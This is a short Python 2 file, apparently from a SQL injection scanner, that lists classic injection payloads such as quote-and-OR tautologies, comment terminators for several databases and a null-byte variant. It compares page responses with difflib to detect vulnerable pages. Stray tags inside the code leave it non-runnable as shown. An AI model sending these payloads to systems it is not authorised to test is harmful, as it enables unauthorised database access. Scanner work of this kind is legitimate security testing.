import difflib

"""
Solutions:
1. compare pages only  
match = re.findall(r'<pre>', html)

2. add false page to compare
match = re.findall(r'<ins>.+', compare_res)

3. add another label "' or '1'='1" as ground truth
Assumption: should be the same page for sql injection, different with false page
singel quote and double quote is not fixed yet.
"""

def get_false():
	## the second is taken as ground truth to filter out real sql-injection page
	<fix/># payloads = ["' and '1=2", "' or '1'='1", '" or "1"="1']
	payloads = ["' and '1=2",'" or "1"="1', "' or '1'='1"]</fix>
	return payloads

# def get_false():
# 	payloads = "' and '1=2"
# 	return payloads

def get_all():
	"""
	Consider different db types and versions
	-- MySQL, MSSQL, Oracle, PostgreSQL, SQLite
	' OR '1'='1' --
	' OR '1'='1' /*
	-- MySQL
	' OR '1'='1' #
	-- Access (using null characters)
	' OR '1'='1' %00
	' OR '1'='1' %16
	"""
	## temp test
	# payloads = ["' or '1=1"]
	<fix/>payloads = ["' or '1=1",   "'1 'or' 1'='1","' or '1'='1",  "'or 1=1#", "' OR '1=1 %00", '" or "1=1']</fix>
	payloads = [(item, "SQL Injection") for item in payloads]
	return payloads	

def compare_html(html1, html2):
	diff_html = ""
	diffs = difflib.ndiff(html1.splitlines(), html2.splitlines())
	for ele in diffs:
		if (ele[0] == "-"):
			diff_html += "<del>%s</del>" % ele[1:].strip()
		elif(ele[0] == "+"):
			diff_html += "<ins>%s</ins>" %ele[1:].strip()

	return diff_html

if __name__ == "__main__":	
	print get_all()
